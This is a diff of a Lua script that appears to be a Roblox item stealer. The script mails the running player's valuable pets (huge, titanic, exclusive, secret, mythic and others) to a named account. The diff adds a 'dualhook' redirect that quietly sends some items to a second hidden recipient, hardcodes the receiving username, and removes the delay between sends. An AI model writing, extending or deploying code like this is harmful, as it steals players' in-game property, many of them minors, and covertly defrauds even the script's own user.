@@ -1261,7 +1261,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1276,6 +1276,7 @@ if FinalList == 0 then
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
+            user = dhuser
         end
     end
     local args = {
@@ -1295,6 +1296,7 @@ spawn(function()
                 user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1306,7 +1308,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1322,6 +1324,7 @@ spawn(function()
                 user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1333,7 +1336,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1351,6 +1354,7 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1362,7 +1366,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1379,6 +1383,7 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1390,7 +1395,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1406,6 +1411,7 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1417,7 +1423,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1433,6 +1439,7 @@ spawn(function()
                 user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1444,7 +1451,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1460,6 +1467,7 @@ spawn(function()
                 user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1471,7 +1479,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1487,6 +1495,7 @@ spawn(function()
                 user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1498,7 +1507,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
